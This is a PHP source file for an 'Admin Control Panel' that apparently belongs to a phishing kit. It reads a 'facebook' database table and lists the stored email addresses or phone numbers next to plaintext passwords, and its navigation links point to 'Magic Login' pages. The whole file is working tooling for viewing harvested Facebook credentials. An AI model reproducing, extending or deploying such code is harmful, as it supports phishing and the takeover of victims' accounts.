<?php 

require 'functions.php';
$datas = show("SELECT * FROM facebook");

?>

<html>
<head>
    <meta charset="utf-8">
    <title>Admin Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="//netdna.bootstrapcdn.com/bootstrap/3.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
    <style type="text/css">
    @import url(http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.min.css);
    body{margin-top:20px;}
    .fa-fw {width: 2em;}
    </style>
    <script src="//code.jquery.com/jquery-1.10.2.min.js"></script>
    <script src="//netdna.bootstrapcdn.com/bootstrap/3.0.0/js/bootstrap.min.js"></script>
    <script type="text/javascript">
        window.alert = function(){};
        var defaultCSS = document.getElementById('bootstrap-css');
        function changeCSS(css){
            if(css) $('head > link').filter(':first').replaceWith('<link rel="stylesheet" href="'+ css +'" type="text/css" />'); 
            else $('head > link').filter(':first').replaceWith(defaultCSS); 
        }
        $( document ).ready(function() {
          var iframe_height = parseInt($('html').height()); 
          window.parent.postMessage( iframe_height, 'https://bootsnipp.com');
        });
    </script>
    <link rel="icon" type="image/png" href="res/favicon.png"/>
</head>
<body>
    <div class="container">
    <div class="row">
        <div class="col-md-3">
            <ul class="nav nav-pills nav-stacked">
                <li class="active"><a href="index.php"><i class="fa fa-home fa-fw"></i>Home</a></li>
                <li><a href="magiclogin.php"><i class="fa fa-table fa-fw"></i>Magic Login</a></li>
                <li><a href="projects.php"><i class="fa fa-file-o fa-fw"></i>Projects</a></li>
        </div>
        <div class="col-md-9 well">
            <a href="index.php">Admin Panel</a> / <a href="../magiclogin.php">Magic Login</a> / Facebook
        </div>

        <div class="col-md-3">
        <table class="table table-bordered">
        <?php $i = 1 ?>
        	<tr>
        		<th>No.</th>
        		<th>Email / Phone</th>
        		<th>Password</th>
        	</tr>
        	<?php foreach($datas as $fb): ?>
        	<tr>
        		<td><?= $i ?></td>
        		<td><?= $fb["email"]?></td>
        		<td><?= $fb["password"] ?></td>
        	</tr>
        	<?php $i++ ?>
        	<?php endforeach; ?>
        </table>
        </div>
</body>
</html>